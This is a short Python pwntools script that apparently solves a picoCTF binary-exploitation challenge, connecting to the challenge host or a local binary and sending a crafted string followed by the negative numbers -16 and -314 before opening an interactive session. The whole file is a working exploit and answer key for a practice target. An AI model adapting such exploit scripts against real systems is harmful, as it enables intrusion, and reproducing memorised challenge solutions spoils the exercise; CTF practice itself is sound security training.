#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 57603
HOST = "saturn.picoctf.net"
exe = context.binary = ELF('./vuln', checksec=False)
# lib = ELF('./libc.so.6', checksec=False)
lib = exe.libc

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x080495F2
            b* 0x08049614
            b* 0x08049637
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE


# PAYLOAD
payload = b'z'*10 + b'u'
p.sendlineafter(b'1337 >> ', payload)
p.sendlineafter(b'\n', str(-16))
# GDB()
p.sendline(str(-314))

p.interactive()